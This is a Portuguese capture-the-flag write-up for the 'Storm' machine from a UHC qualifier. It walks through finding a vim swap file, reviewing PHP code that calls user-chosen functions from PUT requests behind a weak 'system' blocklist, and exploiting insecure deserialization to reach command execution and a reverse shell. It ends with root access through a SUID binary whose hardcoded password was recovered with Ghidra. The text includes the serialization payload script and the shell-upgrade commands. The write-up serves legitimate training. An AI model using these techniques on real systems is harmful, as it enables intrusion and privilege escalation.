---
layout: article
title:  "UHCCTF (Classificat√≥ria) - Storm"
tags: pt-br ctf write-up
---

Essa m√°quina foi feita pelo Kadu para a classificat√≥ria do UHCv34.

# Recon

A p√°gina inicial dessa maquina √© apenas uma foto de uma tempestade gigante, e podemos comprovar isso vendo o source code...

![/assets/storm/Untitled.png](/assets/storm/Untitled.png)

![/assets/storm/Untitled%201.png](/assets/storm/Untitled%201.png)

Como de costume em todos os recons, vamos fazer um fuzzing em busca de diret√≥rios e arquivos, utilizarei o ffuf com as wordlists "common.txt" e "quickhits.txt".

common.txt:

![/assets/storm/Untitled%202.png](/assets/storm/Untitled%202.png)

Encontramos duas coisas interessantes, info.php e config.php:

- info.php:
parece que tem um phpinfo() rodando ai..., interessante para pegarmos algumas informa√ß√µes de vers√£o de servi√ßos e software, al√©m de informa√ß√µes sobre a configura√ß√£o do servidor. (Pesquisei por exploits para os servi√ßos por√©m nada foi encontrado üò¢)

![/assets/storm/Untitled%203.png](/assets/storm/Untitled%203.png)

- config.php

Ops! (Status code 200, muito estranho, rs)

![/assets/storm/Untitled%204.png](/assets/storm/Untitled%204.png)

quickhits.txt:

![/assets/storm/Untitled%205.png](/assets/storm/Untitled%205.png)

Opa! No meio de v√°rios falsos positivos encontramos um arquivo chamado ".config.php.swp", parece ser um arquivo de swap do vim (gerado quando se abre um arquivo no vim, no caso o que foi aberto foi o config.php). 

![/assets/storm/Untitled%206.png](/assets/storm/Untitled%206.png)

Como podemos ver √© o c√≥digo php do arquivo "config.php".

Observando com o Ctrl+U (View-Source) podemos ver a primeira flag!

![/assets/storm/Untitled%207.png](/assets/storm/Untitled%207.png)

Parece que teremos de fazer um code review nesse c√≥digo e entender aquele Access Denided que recebemos no config.php...

Para melhorar nossa visualiza√ß√£o vamos tentar recuperar esse arquivo usando o pr√≥prio vim:

```bash
wget https://storm.uhclabs.com/.config.php.swp #download the file
vim -r .config.php.swp #recover the file
```

Agora apenas dei enter.

![/assets/storm/Untitled%208.png](/assets/storm/Untitled%208.png)

Lets debug friends!

![/assets/storm/Untitled%209.png](/assets/storm/Untitled%209.png)

(Essa parte do write-up vai exigir o b√°sico de php, tentarei explicar da melhor forma, mas se voc√™ n√£o entende muito de php, um aviso, voc√™ vai ficar meio doido)

## Code Review

Para entender eu recomendo fortemente que voc√™ reproduza o ambiente na sua m√°quina!

Aqui est√° o motivo de recebermos acesso negado!

![/assets/storm/Untitled%2010.png](/assets/storm/Untitled%2010.png)

Eu reproduzi o ambiente localmente, ai vai meu c√≥digo comentado para entendermos:

(Amigos brasileiros, desculpa por estar em ingl√™s, √© para o pessoal poder entender o c√≥digo)

```php
<?php
//my reproduce script
Class UHCProtocol{                   //declare a new class 
    public $data;
    public function __wakeup(){      //exploitable function by insecure deserealization**
    $this->add();
    }
    public function add(){
        return call_user_func($this->data, $_SERVER['QUERY_STRING']); //call a function with value of $data and use arguments with value in query string of the http request
    }

if($_SERVER['REQUEST_METHOD'] == "PUT"){  //verify type of the request, in case we have to use PUT

$raw = file_get_contents("php://input"); //put on $raw all contents of request body (php://input is the request body)

    if(strpos($raw, "::") !== false){ //verify if have "::" on $raw content and if yes return true
        $call = explode("::", $raw); //separte in a array $raw by "::" and put this on array named $call
        $badfuncs = ['system', 'aaaa'];  //declare a array with denided functions

        if(in_array($call[0], $badfuncs)){ //verify if in first part of $raw, before :: ($call[0]) have any of denides functions
            die("Denied Func!"); //if yes, die() with a message "Denied Func!"
        }
        if(strpos($call[1], "|") !== false){ //verify if in second part of $raw, after :: ($call[1]) have a "|"
            $data = explode("|", $call[1]); //if yes separate $call[1] by | and put this on a array named $data
            call_user_func_array($call[0], $data); //call a function with $call[0] value and $data value in arguments
        }else{ //if not...
            call_user_func($call[0], $call[1]); //call a function with $call[0] value and $call[1] value in arguments
        }
    }
}
?>
```

Basicamente o que temos que fazer para come√ßar a testar √© mandar um request PUT e nos valores do body passar nossa payload contendo "::". Dando uma lida sobre como usar a fun√ß√£o call_user_func do php podemos perceber que o primeiro argumento √© o nome da fun√ß√£o que queremos rodar, e o segundo argumento s√£o os valores a serem passados para essa fun√ß√£o, exemplo:

```php
call_user_func("print_r", "hello"); //will print "hello"
```

Como podemos observar no nosso c√≥digo comentado, se seguirmos as valida√ß√µes do if, o c√≥digo dever√° executar uma fun√ß√£o que colocarmos antes do "::" e os argumentos ser√£o os valores que colocarmos depois do "::".

```
print_r::hello
```

Vamos abrir o burp e enviar esse PUT contendo nossa payload.

![/assets/storm/Untitled%2011.png](/assets/storm/Untitled%2011.png)

Recebemos Access Denided!, isso deve ser pelo fato de estarmos acessando o config.php, vamos ent√£o pensar, para que um script "config.php' √© usado? para setar todas as vari√°veis e classes de configura√ß√£o do site, portando outras p√°ginas do site d√£o um include nele...

Vamos mandar o request para index.php, ja que provavelmente ele inclui o config.php no c√≥digo...

![/assets/storm/Untitled%2012.png](/assets/storm/Untitled%2012.png)

Deu certo, bom agora vamos ver o que podemos fazer com isso, usar fun√ß√µes para ler arquivos (LFI), rodar fun√ß√µes de sistema? N√£o pois elas est√£o sendo checadas na nossa payload, ent√£o o que vamos fazer?

Lembram do coment√°rio na fun√ß√£o wakeup da classe?

O que vamos ter que fazer √© uma desseraliza√ß√£o insegura!

# Exploitation 
## RCE

[Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization)

Recomendo quem n√£o souber do que se trata dar uma pesquisada em alguns artigos.

Aqui vai o c√≥digo da classe vulner√°vel:

```php
Class UHCProtocol{
    public $data;
    public function __wakeup(){
    $this->add();
    }
    public function add(){
        return call_user_func($this->data, $_SERVER['QUERY_STRING']);
    }
}
```

Observem a fun√ß√£o wakeup, ela √© uma fun√ß√£o que recebe o nome de fun√ß√£o m√°gica. Toda vez que no php um objeto √© desserealizado essa fun√ß√£o √© chamada.

Nessa classe a fun√ß√£o wakeup est√° executando a fun√ß√£o add() que por sua vez tem um call_user_func que recebe os valores $data e os valores contidos na query do request (http://website.com/index.php?this-is=a-query).

O valor de $data vai ser o nome da fun√ß√£o que o call_user_func vai executar e os calores da query ser√£o os argumentos...

Ok, temos o c√≥digo vulner√°vel a desserealiza√ß√£o, mas onde tem um objeto para ser desserealizado?

Simples! Se lembram do nosso "poder" de executar fun√ß√µes com o nosso body malicioso no request PUT? Vamos um "unserealize" com os argumentos sendo um objeto modificado por n√≥s.

Esse objeto modificado ter√° que ter o nome da fun√ß√£o que iremos rodar com o valor de $data, portanto vamos apenas escrever um script para serializar uma classe modificada.

```php
<?php
Class UHCProtocol{
    public $data = "print_r";
    public function __wakeup(){
    $this->add();
    }
    public function add(){
        return call_user_func($this->data, $_SERVER['QUERY_STRING']);
    }
}
$object = new UHCProtocol();
echo serialize($object);
?>
```

![/assets/storm/Untitled%2013.png](/assets/storm/Untitled%2013.png)

Agora vamos desserealizar isso e passar os argumentos na query da URL:

![/assets/storm/Untitled%2014.png](/assets/storm/Untitled%2014.png)

Conseguimos! Com isso n√£o precisamos nos importar com as fun√ß√µes proibidas do config.php, j√° que nosso $data n√£o passa por nenhum tipo de valida√ß√£o.

Por√©m vamos ver no info.php se tem alguma fun√ß√£o que n√£o tenha sido desabilitada que possa permitir um RCE.

![/assets/storm/Untitled%2015.png](/assets/storm/Untitled%2015.png)

Dando uma olhada, parece que a fun√ß√£o "exec" est√° liberada, vamos testar, por√©m √© importante lembrar que a fun√ß√£o exec n√£o possui output, logo vamos rodar um "sleep" para ver se o c√≥digo foi executado.

![/assets/storm/Untitled%2016.png](/assets/storm/Untitled%2016.png)

Parece que deu certo, utilizei ${IFS} pois √© um bypass para dar um espa√ßo no linux. 

Temos RCE, agora vamos pegar uma reverse shell!

# P√≥s-exploitation 
## Root

![/assets/storm/Untitled%2017.png](/assets/storm/Untitled%2017.png)

Habemos shell!

```
Full tty shell
in your shell~ python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
in your terminal~ stty raw -echo; fg
ENTER
in your shell~ export TERM=xterm
```

E dando uma olhada no "/", habemos flag!

![/assets/storm/Untitled%2018.png](/assets/storm/Untitled%2018.png)

Fazendo um recon normal de p√≥s exploitation, consegui achar algumas coisas interessantes, a mais especial, um script com permiss√£o de SUID chamado "storm" no / :

![/assets/storm/Untitled%2019.png](/assets/storm/Untitled%2019.png)

Rodando ele parece que ele tem alguma palavra certa para se usar, como uma senha:

![/assets/storm/Untitled%2020.png](/assets/storm/Untitled%2020.png)

Vamos usar o Ghidra para analizar o programa baixando para a nossa m√°quina e fazendo uma engenharia reversa para ver como ele est√° funcionando:

![/assets/storm/Untitled%2021.png](/assets/storm/Untitled%2021.png)

Esse √© o c√≥digo decompilado pelo ghidra, o programa recebe um valor digitado pelo usu√°rio pelo scanf e compara esse valor a uma string com o strcmp(), e ent√£o dependendo do que retornar dessa compara√ß√£o ele vai executar um sleep e uma fun√ß√£o chamada shell ou vai executar um print dizendo "Invalid cloud name".

O que tem na fun√ß√£o shell?

![/assets/storm/Untitled%2022.png](/assets/storm/Untitled%2022.png)

Lembram que o programa tinha o capability de SUID? Nessa fun√ß√£o shell ele seta o UID para 0 (root) e chama uma shell, isso significa que se a nossa compara√ß√£o retornar true (se digitarmos a palavra certa), o programa vai nos dar uma shell de root. 

Vamos dar uma olhada nessa compara√ß√£o novamente.

```c
iVar1 = strcmp("__libc_csu_fini",acStack200); 
```

Perceberam? √â uma string, o prgrama verifica se no input do usu√°rio existe "__libc_csu_fini", logo, temos a "senha"! Vamos usar.

![/assets/storm/Untitled%2023.png](/assets/storm/Untitled%2023.png)

Depois de um tempo (por conta do sleep), o programa nos da uma shell de root!

Na home do root encontrei a flag!

![/assets/storm/Untitled%2024.png](/assets/storm/Untitled%2024.png)

√â isso, obrigado por ler at√© aqui, e parab√©ns kadu pela m√°quina!